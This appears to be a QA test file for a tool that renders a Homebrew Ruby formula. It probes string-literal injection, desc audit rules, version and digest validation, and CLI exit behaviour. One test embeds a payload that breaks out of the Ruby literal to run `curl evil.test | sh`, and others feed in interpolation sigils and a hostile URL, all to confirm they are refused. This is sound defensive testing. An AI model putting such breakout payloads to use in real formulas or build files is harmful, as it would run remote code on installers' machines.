import { afterAll, describe, expect, it } from 'vitest'
import { spawnSync } from 'node:child_process'
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { codeWithoutComments } from './helpers/source-code.js'
import { renderFormula } from '../scripts/lib/render-homebrew-formula.js'

// #197 QA augmentation. The dev's test/homebrew-formula.test.js proves the formula's
// shape (banner, class, url, sha256, depends_on, install, test do), that url and
// `test do` agree across four versions, that a malformed digest and a non-semver
// version are refused, that `desc` follows five of the auditor's rules, and that the
// CLI plumbs flags without spelling Ruby.
//
// WHAT THAT GREEN CANNOT DISTINGUISH. The renderer's job is to emit RUBY SOURCE from
// strings, and its guard against a value escaping its double-quoted literal is one
// regex, checked against exactly four payloads, all of them on `description`. When
// this file was written that regex was /["\\\n\r]|#\{/; the interpolation defect
// recorded below moved it to /["\\\n\r]|#[{@$]/, which is what the renderer's
// RUBY_UNSAFE reads now. A guard tested only with the payloads it
// was written for proves the four it knows about, not the class it claims. So the
// largest section below attacks
// the literal itself, on all three string fields, from both sides: payloads that must
// be refused, and payloads that must NOT be (a fix that blocks every `#` would break
// this package's own homepage, `https://github.com/lucasfe/ralph#readme`).
//
// HOW THE RUBY CLAIMS HERE WERE MEASURED. Every statement below about what Ruby does
// with an emitted literal was run, not reasoned — under macOS system ruby 2.6.10 and
// again under the portable ruby 4.0.6 that `brew` itself runs on, with the same answers:
//
//   $ ruby -w -e 'x = "a #@b c"; puts x.inspect'
//   -e:1: warning: instance variable @b not initialized
//   "a  c"
//
// Each rendered `desc` literal was then eval'd and compared with the text the renderer
// meant to write. Three sigils came back different: `#@ivar` evaluates to "" (silent
// text loss), `#$gvar` splices a global's value in ("Resolves #<IO:0x…> issues" for
// `#$stdout`), and `#@@cvar` raises NameError, which inside a class body means the file
// cannot be loaded at all. A backtick, a single quote, `%q(`, a bare `#` and a `$` all
// came back IDENTICAL, so they are harmless and are pinned here as such.
//
// HOW THE `desc` CLAIMS WERE MEASURED. Not from the transcription in the renderer's
// comments, but by running Homebrew's own cop over rendered formulae, in process:
//
//   RuboCop::Cop::FormulaAudit::Desc, driven through a Commissioner over the rendered
//   ralph.rb — Homebrew 6.0.21-34-ga8820d0, its vendored rubocop 1.89.0.
//
// The package's real description renders clean. `"The Ralph autonomous issue loop"`
// rendered `desc "Ralph autonomous issue loop"` before the fix in this change, and the
// cop answered:
//   * FormulaAudit/Desc: Description shouldn't start with the formula name.
// It now renders `desc "Autonomous issue loop"`, which the cop accepts. That cop is NOT
// invoked from this file: a spec that shells into `brew` would tie the
// suite to a Homebrew install it cannot assume. So the one rule that matters here is
// transcribed as AUDIT_NAME_PREFIX below, and a control test proves the transcription
// can tell the clean desc from the offending one.
//
// TWO TESTS HERE WERE RED ON PURPOSE, and both defects were fixed in this same change
// rather than papered over: the literal guard missed Ruby's braceless interpolations,
// and stripping the leading article uncovered the formula name. The comment above each
// one records what it caught and how the renderer answers now. Nothing in this file is
// expected to fail — a red here is a regression, not a hand-back.

const REPO_ROOT = fileURLToPath(new URL('..', import.meta.url))
const RENDERER = join(REPO_ROOT, 'scripts', 'lib', 'render-homebrew-formula.js')
const CLI = join(REPO_ROOT, 'scripts', 'generate-homebrew-formula.js')
const pkg = JSON.parse(readFileSync(join(REPO_ROOT, 'package.json'), 'utf8'))

const DIGEST = '0123456789abcdef'.repeat(4)

// The package's own metadata, which is what the CLI passes in.
const META = Object.freeze({
  description: 'Ralph — autonomous GitHub issue resolution loop, packaged as a CLI.',
  homepage: 'https://github.com/lucasfe/ralph#readme',
  license: 'MIT',
})

function render(overrides = {}) {
  return renderFormula({ version: '1.2.3', sha256: DIGEST, ...META, ...overrides })
}

/** The single argument of a top-level `name "value"` call, or null. */
function field(text, name) {
  return new RegExp(`^  ${name} "(.*)"$`, 'm').exec(text)?.[1] ?? null
}

const urlVersion = (text) =>
  /archive\/refs\/tags\/v(.+)\.tar\.gz$/.exec(field(text, 'url') ?? '')?.[1] ?? null
const testBlockVersion = (text) => /assert_match "(.+)", shell_output/.exec(text)?.[1] ?? null

// desc_helper.rb's own name-prefix rule, transcribed: the formula name with hyphens
// deleted, one character per group, each pair optionally separated by whitespace or a
// hyphen, anchored at the start and closed by a word boundary.
//   name_regex = T.must(name).delete("-").chars.join('[\s\-]?')
//   if regex_match_group(desc, /^#{name_regex}\b/i)
const AUDIT_NAME_PREFIX = new RegExp(`^${'ralph'.split('').join('[\\s\\-]?')}\\b`, 'i')

const workDirs = []
afterAll(() => {
  for (const dir of workDirs) rmSync(dir, { recursive: true, force: true })
})

function workDir() {
  const dir = mkdtempSync(join(tmpdir(), 'ralph-brew-qa-'))
  workDirs.push(dir)
  return dir
}

function runCli(args, cwd = workDir()) {
  return spawnSync(process.execPath, [CLI, ...args], { cwd, encoding: 'utf8' })
}

function runCliOk(args, cwd) {
  const result = runCli(args, cwd)
  expect(result.status, `generator failed:\n${result.stderr}`).toBe(0)
  return result
}

// ---------------------------------------------------------------------------
// 1. The Ruby literal, attacked on every field that reaches one
// ---------------------------------------------------------------------------

describe('QA #197 — breaking out of the Ruby double-quoted literal', () => {
  // WAS RED — A DEFECT, FIXED IN THIS CHANGE. `#{}` is not Ruby's only interpolation:
  // inside a double-quoted string, `#@ivar`, `#@@cvar` and `#$gvar` interpolate too,
  // with no braces. The guard's regex looked only for `#\{` while its own error message
  // promised to refuse "a Ruby interpolation" — so all three were emitted verbatim into
  // Formula/ralph.rb and Ruby then read them as code. It now refuses `#` before any of
  // `{`, `@` or `$` (RUBY_UNSAFE in the renderer), which is what these rows pin.
  // Measured on the rendered literals, evaluated in a stand-in class body under
  // Homebrew's own portable ruby 4.0.6:
  //
  //   desc "Resolves #@version issues"  -> "Resolves  issues"          (text lost)
  //   desc "Resolves #$stdout issues"   -> "Resolves #<IO:0x…> issues" (value spliced)
  //   desc "Resolves #@@count issues"   -> NameError: uninitialized class variable
  //                                       @@count in QaProbe
  //
  // The third is the worst of them: an uninitialized class variable raises while the
  // class body is being evaluated, so `brew` could not have loaded the formula at all.
  // None of the three executes an arbitrary expression the way `#{}` would, so the
  // defect was silent corruption rather than code execution — but these are exactly the
  // values the guard's own message promised to refuse, and the ones a human edits in
  // package.json.
  it.each([
    ['description', 'an instance variable', 'Resolves #@version issues'],
    ['description', 'a class variable', 'Resolves #@@count issues'],
    ['description', 'a global variable', 'Resolves #$stdout issues'],
    ['homepage', 'an instance variable', 'https://github.com/lucasfe/ralph#@readme'],
  ])('refuses a %s interpolating %s, as `#{}` is not the only interpolation', (name, _what, value) => {
    expect(() => render({ [name]: value })).toThrow(new RegExp(name, 'i'))
  })

  it.each(['description', 'homepage', 'license'])(
    'guards %s against all five characters that would change what the literal means',
    (name) => {
      // The dev's four payloads all go through `description`, which is the field that
      // is normalized first — so nothing yet proves `homepage` and `license` reach the
      // same check. A `"` in either one closes the literal just as effectively.
      const embed = {
        description: (c) => `Resolves ${c} issues`,
        homepage: (c) => `https://x.test/${c}`,
        license: (c) => `MIT${c}`,
      }[name]
      for (const [label, char] of [
        ['a double quote', '"'],
        ['a backslash', '\\'],
        ['a braced interpolation', '#{x}'],
        ['a newline', '\n'],
        ['a carriage return', '\r'],
      ]) {
        expect(
          () => render({ [name]: embed(char) }),
          `${name} holding ${label} was rendered into the formula`,
        ).toThrow(new RegExp(name, 'i'))
      }
    },
  )

  it('refuses a description that closes the literal and adds a formula method of its own', () => {
    // The shape that would matter: end the desc string, open a line of Ruby that runs
    // at install time, and re-open a string so the file still parses. The quote is what
    // stops it, which is why the guard checks for one rather than escaping it.
    const payload = 'Resolves issues"\n  system "curl evil.test | sh"\n  x "'
    // A TypeError, not a return value: the payload is refused outright, so there is no
    // formula to inspect for an escaped copy of it.
    expect(() => render({ description: payload })).toThrow(TypeError)
    expect(() => render({ description: payload })).toThrow(/description/i)
  })

  it('keeps a URL fragment, which is a `#` that is not an interpolation', () => {
    // A guard tightened by blocking every `#` would refuse this package's own homepage.
    // Measured in ruby: `"https://github.com/lucasfe/ralph#readme"` evaluates to
    // itself, because `#` only interpolates before `{`, `@` or `$`.
    expect(field(render(), 'homepage')).toBe('https://github.com/lucasfe/ralph#readme')
  })

  it('does not over-block what a Ruby double-quoted literal treats as ordinary text', () => {
    // Each of these was eval'd in ruby and came back byte-identical to the literal, so
    // refusing them would cost a legitimate description for nothing. A backtick only
    // runs a command in `...` form, not inside "..."; `end` is a keyword only at the
    // start of an expression, and reaching one needs a newline, which IS refused above.
    for (const [label, description] of [
      ['a backtick', 'Resolves `id` issues'],
      ['a single quote', "Resolves 'GitHub' issues"],
      ['a percent literal', 'Resolves %q(x) issues'],
      ['a bare hash', 'Resolves #42 issues'],
      ['a dollar sign', 'Costs $5 per loop'],
      ['a plus', 'Loops 1+1 times'],
      ['the word end', 'Resolves issues; end'],
    ]) {
      expect(() => render({ description }), `${label} was refused`).not.toThrow()
      expect(field(render({ description }), 'desc')).toBe(description)
    }
  })
})

// ---------------------------------------------------------------------------
// 2. `desc`, against the auditor's own rules
// ---------------------------------------------------------------------------

describe('QA #197 — desc, at the edges of the rules it normalizes for', () => {
  it('renders a desc the transcribed name rule accepts, for the description that ships', () => {
    // The control for the test below: without it, a matcher that never matches would
    // make the next assertion pass by being broken.
    const desc = field(render(), 'desc')
    expect(desc).toBe('Autonomous GitHub issue resolution loop, packaged as a CLI')
    expect(desc).not.toMatch(AUDIT_NAME_PREFIX)
    expect('Ralph autonomous issue loop').toMatch(AUDIT_NAME_PREFIX)
  })

  // WAS RED — A DEFECT, FIXED IN THIS CHANGE. The name prefix was stripped FIRST and the
  // article SECOND, with nothing looking again afterwards — so a description that opened
  // with an article in front of the name had the article removed and handed the name
  // straight to the front of the desc. Measured with Homebrew's own cop over the
  // rendered formula:
  //   description "The Ralph autonomous issue loop"
  //   -> desc "Ralph autonomous issue loop"
  //   -> FormulaAudit/Desc: Description shouldn't start with the formula name.
  // Which is the single rule that normalization exists to satisfy. The renderer now
  // strips article-then-name to a fixpoint (the do/while in homebrewDesc) and
  // answers `desc "Autonomous issue loop"`. Refusing the description outright would have
  // been an acceptable fix too, so this test still allows a throw and only insists that
  // no desc audit rejects is emitted.
  it('does not hand the formula name to the front of desc when an article precedes it', () => {
    let desc
    try {
      desc = field(render({ description: 'The Ralph autonomous issue loop' }), 'desc')
    } catch {
      return // refusing the description is an acceptable answer; emitting a bad desc is not
    }
    expect(desc, "brew audit: Description shouldn't start with the formula name").not.toMatch(
      AUDIT_NAME_PREFIX,
    )
  })

  it('accepts a desc of exactly 80 characters and refuses one of 81', () => {
    // desc_helper.rb reads `return if desc_length <= MAX_DESC_LENGTH` and reports only
    // past that, so 80 is legal and 81 is not. The dev's spec uses an 85-character desc,
    // which cannot see an off-by-one in either direction.
    const of = (n) => `D${'x'.repeat(n - 1)}`
    expect(field(render({ description: of(80) }), 'desc')).toHaveLength(80)
    expect(() => render({ description: of(81) })).toThrow(RangeError)
    expect(() => render({ description: of(81) })).toThrow(/81/)
  })

  it('normalizes an already-normalized desc to itself', () => {
    // Idempotence. A second pass over an already-normalized desc — one read back out of
    // an existing formula, say — must not strip a further article or a further stop, or
    // the same description would render differently depending on where it came from.
    const once = field(render(), 'desc')
    expect(field(render({ description: once }), 'desc')).toBe(once)
  })

  it('leaves a first character that is not a letter exactly as it is', () => {
    // `desc[0].toUpperCase()` is a no-op on a punctuation mark, and the auditor agrees:
    // its capital-letter rule fires on /^[a-z]/ only, so "(experimental) …" is legal.
    expect(field(render({ description: '(experimental) issue loop' }), 'desc')).toBe(
      '(experimental) issue loop',
    )
  })

  it('counts a non-breaking space as the whitespace a leading article needs', () => {
    // The article regex requires (?=\s), and JS \s includes U+00A0 — so an article
    // followed by a non-breaking space is still stripped. That is harmless
    // over-normalization, not audit compliance: Ruby's \s is ASCII-only, so
    // desc_helper.rb:53's /^(the|an?)(?=\s)/i never fires on this description and the
    // auditor would have let it through untouched. Measured under portable ruby 4.0.6,
    // with nbsp = U+00A0:
    //   /\s/ =~ nbsp                                  # => nil
    //   /^(the|an?)(?=\s)/i =~ "The#{nbsp}autonomous loop"  # => nil
    //   /^(the|an?)(?=\s)/i =~ "The autonomous loop"        # => 0
    // Pinned so that narrowing LEADING_ARTICLE to ASCII whitespace later is understood
    // as a behaviour change here, not as a fix to a broken formula.
    const nbsp = String.fromCharCode(0x00a0)
    expect(field(render({ description: `The${nbsp}autonomous loop` }), 'desc')).toBe(
      'Autonomous loop',
    )
  })

  it('refuses Other Symbols only, and keeps currency, math and dash punctuation', () => {
    // \p{So} is the whole of the auditor's symbol rule. An em-dash is Pd, `$` is Sc and
    // `±` is Sm, so all three are legal in a desc and refusing them would be wrong.
    for (const description of ['Fast \u{1F680} loop', 'Fast ⚠ loop']) {
      expect(() => render({ description }), `${description} was rendered`).toThrow(/symbol/i)
    }
    expect(field(render({ description: 'Resolves issues — in a loop' }), 'desc')).toBe(
      'Resolves issues — in a loop',
    )
    expect(field(render({ description: 'Costs $5 and loops ± twice' }), 'desc')).toBe(
      'Costs $5 and loops ± twice',
    )
  })
})

// ---------------------------------------------------------------------------
// 3. The options object itself
// ---------------------------------------------------------------------------

describe('QA #197 — the options object, and the purity that depends on it', () => {
  it.each([
    ['no argument at all', undefined],
    ['null', null],
    ['a string', '1.2.3'],
    ['a number', 7],
    ['a boolean', true],
  ])('refuses %s with one message rather than a property access on nothing', (_label, options) => {
    expect(() => renderFormula(options)).toThrow(/expected an options object/)
  })

  it.each([
    ['an empty object', {}],
    ['an array', []],
  ])('treats %s as an options object and fails on the first missing field', (_label, options) => {
    // `typeof [] === 'object'`, so an array gets past the shape check and is caught by
    // the per-field validation instead. Pinned because the message an operator sees is
    // the difference between "you passed the wrong thing" and "your version is wrong".
    expect(() => renderFormula(options)).toThrow(/version/i)
  })

  it('renders from a frozen options object, so it cannot be writing anything back', () => {
    const options = Object.freeze({ version: '1.2.3', sha256: DIGEST, ...META })
    expect(() => renderFormula(options)).not.toThrow()
    expect(renderFormula(options)).toBe(render())
  })

  it('keeps no reference to the caller’s object: a later mutation cannot change the text', () => {
    const options = { version: '1.2.3', sha256: DIGEST, ...META }
    const text = renderFormula(options)
    options.version = '9.9.9'
    options.description = 'MUTATED AFTER THE CALL'
    options.sha256 = 'f'.repeat(64)

    expect(urlVersion(text)).toBe('1.2.3')
    expect(text).not.toContain('MUTATED')
    expect(text).toBe(render())
  })

  it('is unaffected by key order, and ignores a key it did not ask for', () => {
    const reordered = {
      license: META.license,
      homepage: META.homepage,
      description: META.description,
      sha256: DIGEST,
      version: '1.2.3',
    }
    expect(renderFormula(reordered)).toBe(render())
    // A caller cannot smuggle a field in: `url` is built, never taken.
    expect(render({ url: 'https://evil.test/x.tar.gz' })).not.toContain('evil.test')
  })

  it('reaches for nothing ambient in its CODE, comments excluded', () => {
    // The dev's purity spec greps the raw source, where a comment can answer for the
    // code. This one greps the code with the prose taken out, and adds the ambient reads
    // an import-free module could still reach — `import.meta` and `globalThis`.
    const code = codeWithoutComments(RENDERER)
    expect(code).not.toMatch(/import\.meta/)
    expect(code).not.toMatch(/globalThis/)
    expect(code).not.toMatch(/node:/)
    expect(code).not.toMatch(/\bprocess\b/)
  })
})

// ---------------------------------------------------------------------------
// 4. The version and the digest at the edge of their regexes
// ---------------------------------------------------------------------------

describe('QA #197 — versions and digests at the boundary', () => {
  it.each([
    ['a zero-padded minor', '1.02.3'],
    ['a zero-padded patch', '1.2.03'],
    ['an empty prerelease', '1.2.3-'],
    ['an empty build', '1.2.3+'],
    ['a zero-padded prerelease number', '1.2.3-rc.01'],
    ['a leading space', ' 1.2.3'],
    ['a trailing newline', '1.2.3\n'],
    ['two versions on two lines', '1.2.3\n4.5.6'],
  ])('refuses a version with %s', (_label, version) => {
    // The trailing-newline rows are the ones worth having, and they pass for a reason
    // that is the language's rather than the pattern's: `$` in a JavaScript regex without
    // /m is strict end-of-input, so `1.2.3\n` fails to match. The same pattern in Ruby
    // would accept it — measured: `/^abc$/ =~ "abc\n"` is 0, a match — because there `$`
    // is a line anchor. A version arriving straight off a shell pipeline is the realistic
    // source of one, so it is worth knowing which language's rule is protecting this.
    expect(() => render({ version })).toThrow(/version/i)
  })

  it('accepts semver build metadata and puts it in the url verbatim', () => {
    // PINNING UNSPECIFIED BEHAVIOUR. #197 says "semver, no leading v" and nothing about
    // build metadata; the pattern is semver.org's, which allows it, and none of this
    // repo's 21 tags to date carries a `+`. So this is not a claim that a `+` in a tag
    // URL works — only that today it is rendered rather than refused, and that url and
    // `test do` still agree about it.
    const text = render({ version: '1.2.3-rc.1+build.5' })
    expect(field(text, 'url')).toBe(
      'https://github.com/lucasfe/ralph/archive/refs/tags/v1.2.3-rc.1+build.5.tar.gz',
    )
    expect(testBlockVersion(text)).toBe('1.2.3-rc.1+build.5')
  })

  it.each([
    ['a trailing newline, as a shell pipeline would leave it', `${DIGEST}\n`],
    ['a leading newline', `\n${DIGEST}`],
    ['a 0x prefix', `0x${DIGEST.slice(2)}`],
    ['shasum’s two-column output', `${DIGEST}  -`],
    ['63 hex characters and one that is not', `${DIGEST.slice(0, 63)}g`],
    ['a space in the middle', `${DIGEST.slice(0, 32)} ${DIGEST.slice(33)}`],
  ])('refuses a digest with %s', (_label, sha256) => {
    expect(() => render({ sha256 })).toThrow(/sha256/i)
  })
})

// ---------------------------------------------------------------------------
// 5. Criterion 4: there is nowhere for the two versions to drift apart
// ---------------------------------------------------------------------------

describe('QA #197 — the version cannot drift, because there are only two of it', () => {
  it('writes the version in exactly two places and the digest in exactly one', () => {
    // The dev's spec proves url and `test do` AGREE. This proves there is no THIRD
    // place a version is written — a `version "…"` line, a second URL, a comment
    // quoting the release — which is what would make the agreement fragile later.
    const text = render({ version: '7.8.9' })
    expect(text.match(/7\.8\.9/g)).toHaveLength(2)
    expect(text.match(new RegExp(DIGEST, 'g'))).toHaveLength(1)
  })

  it.each(['0.0.0', '1.2.3-rc.1+build.5', '10.0.0-0.3.7', '99999999999999999999.0.0'])(
    'agrees between url and test do for an exotic version (%s)',
    (version) => {
      const text = render({ version })
      expect(urlVersion(text)).toBe(version)
      expect(testBlockVersion(text)).toBe(version)
    },
  )
})

// ---------------------------------------------------------------------------
// 6. The CLI's flag plumbing and every way it can fail
// ---------------------------------------------------------------------------

describe('QA #197 — the generator CLI: flags, exit codes and streams', () => {
  it('answers the -h short flag the same way as --help', () => {
    const result = runCliOk(['-h'])
    expect(result.stdout).toMatch(/usage/i)
    expect(result.stdout).toBe(runCliOk(['--help']).stdout)
  })

  it('lets --help win over an unknown flag, and still exits 0', () => {
    // PINNED, and deliberate per the source comment: `--help` is checked before argv is
    // parsed at all, so asking for help never fails. The consequence worth pinning is
    // that a release job whose flags are wrong AND which passes --help gets a usage
    // message and a zero exit.
    const result = runCliOk(['--help', '--bogus'])
    expect(result.stdout).toMatch(/usage/i)
    expect(result.stdout).not.toMatch(/class Ralph/)
    expect(result.stderr).toBe('')
  })

  it('names package.json’s real version in the usage text, so the default cannot rot', () => {
    // The default version and the text that documents it come from the same read of
    // package.json. A hardcoded copy in either place would fail here at the next
    // release-please bump rather than in a tap.
    expect(runCliOk(['--help']).stdout).toContain(pkg.version)
  })

  it('takes the last of a repeated flag', () => {
    // PINNING UNSPECIFIED BEHAVIOUR: the parser assigns, so the last wins and no
    // duplicate is reported. Worth locking because the alternative — first wins — would
    // silently ship the wrong digest for the same command line.
    const other = 'f'.repeat(64)
    const result = runCliOk(['--sha256', DIGEST, '--sha256', other])
    expect(field(result.stdout, 'sha256')).toBe(other)
    expect(urlVersion(runCliOk(['--sha256', DIGEST, '--version', '1.1.1', '--version', '2.2.2']).stdout)).toBe(
      '2.2.2',
    )
  })

  it('fails when --sha256 swallows the flag that follows it, and prints no formula', () => {
    // `--sha256 --out foo.rb` takes `--out` as the digest because it is a non-empty
    // string. It still fails, which is what matters — but on `foo.rb` as an unexpected
    // argument rather than on the missing digest, so the message names the wrong thing.
    const result = runCli(['--sha256', '--out', 'ralph.rb'])
    expect(result.status).toBe(1)
    expect(result.stdout).toBe('')
    expect(result.stderr).toMatch(/usage/i)
  })

  it('rejects --sha256=<digest>, the other spelling of the same flag', () => {
    const result = runCli([`--sha256=${DIGEST}`])
    expect(result.status).toBe(1)
    expect(result.stderr).toMatch(/unknown option/)
    expect(result.stdout).toBe('')
  })

  it.each([
    ['a non-semver --version', ['--sha256', DIGEST, '--version', '1.2']],
    ['a --version with no value', ['--sha256', DIGEST, '--version']],
    ['an --out with an empty value', ['--sha256', DIGEST, '--out', '']],
    ['a positional argument', ['--sha256', DIGEST, 'ralph.rb']],
  ])('exits 1 with an empty stdout and a diagnostic on stderr for %s', (_label, args) => {
    // Nothing may reach stdout on a failure: `generate-homebrew-formula … > ralph.rb`
    // is the obvious way to run this, and a half-written or empty formula that a later
    // step treats as real is the failure mode that costs a release.
    const result = runCli(args)
    expect(result.status).toBe(1)
    expect(result.stdout).toBe('')
    expect(result.stderr).toMatch(/generate-homebrew-formula:/)
  })

  it.each([
    ['a directory', (dir) => join(dir, 'adir')],
    ['a path under a directory that does not exist', (dir) => join(dir, 'missing', 'ralph.rb')],
  ])('exits 1 and writes nothing when --out points at %s', (_label, target) => {
    const dir = workDir()
    mkdirSync(join(dir, 'adir'))
    const out = target(dir)
    const result = runCli(['--sha256', DIGEST, '--out', out], dir)

    expect(result.status).toBe(1)
    expect(result.stdout).toBe('')
    expect(result.stderr).toMatch(/generate-homebrew-formula:/)
    // Nothing was created either way: the directory that already existed is still empty,
    // and the one that did not exist was not made on the way to writing into it.
    expect(readdirSync(join(dir, 'adir'))).toEqual([])
    expect(existsSync(join(dir, 'missing'))).toBe(false)
  })

  it('exits 1 and leaves no file when --out is inside a directory it cannot write', () => {
    if (process.getuid?.() === 0) return // root ignores the mode bits
    const dir = workDir()
    const ro = join(dir, 'ro')
    mkdirSync(ro)
    chmodSync(ro, 0o500)
    try {
      const result = runCli(['--sha256', DIGEST, '--out', join(ro, 'ralph.rb')], dir)
      expect(result.status).toBe(1)
      expect(result.stdout).toBe('')
      expect(existsSync(join(ro, 'ralph.rb'))).toBe(false)
    } finally {
      chmodSync(ro, 0o700)
    }
  })

  it('overwrites an existing formula rather than appending to it', () => {
    // A job that re-runs this over a tap's already-checked-out ralph.rb needs the
    // previous release's formula replaced whole — an append would leave two class bodies
    // in one file, which is not what a formula file is.
    const dir = workDir()
    writeFileSync(join(dir, 'ralph.rb'), 'stale contents from the last release\n')
    runCliOk(['--sha256', DIGEST, '--out', 'ralph.rb'], dir)

    const written = readFileSync(join(dir, 'ralph.rb'), 'utf8')
    expect(written).not.toContain('stale')
    expect(written.match(/^class Ralph < Formula$/gm)).toHaveLength(1)
    expect(written).toBe(render({ version: pkg.version, ...META }))
  })

  it('accepts its flags in either order', () => {
    const before = runCliOk(['--version', '9.9.9', '--sha256', DIGEST]).stdout
    const after = runCliOk(['--sha256', DIGEST, '--version', '9.9.9']).stdout
    expect(before).toBe(after)
    expect(urlVersion(before)).toBe('9.9.9')
  })

  it('lowercases an uppercase digest in the formula while echoing what was typed', () => {
    // Two different jobs: the formula gets the digest in the case Homebrew writes, and
    // the confirmation line is a receipt for the operator, so it shows the argument as
    // given. Pinned because "the receipt does not match the file" reads like a bug.
    const dir = workDir()
    const result = runCliOk(['--sha256', DIGEST.toUpperCase(), '--out', 'ralph.rb'], dir)
    expect(field(readFileSync(join(dir, 'ralph.rb'), 'utf8'), 'sha256')).toBe(DIGEST)
    expect(result.stdout).toContain(DIGEST.toUpperCase())
  })

  it('reports the overridden version on the receipt, not package.json’s', () => {
    const dir = workDir()
    const result = runCliOk(['--sha256', DIGEST, '--version', '7.7.7', '--out', 'ralph.rb'], dir)
    expect(result.stdout).toMatch(/version\s+7\.7\.7/)
    expect(urlVersion(readFileSync(join(dir, 'ralph.rb'), 'utf8'))).toBe('7.7.7')
  })
})
